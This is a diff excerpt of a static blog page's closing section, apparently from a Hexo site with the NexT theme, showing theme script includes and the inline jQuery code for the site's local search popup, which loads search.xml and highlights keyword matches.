+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
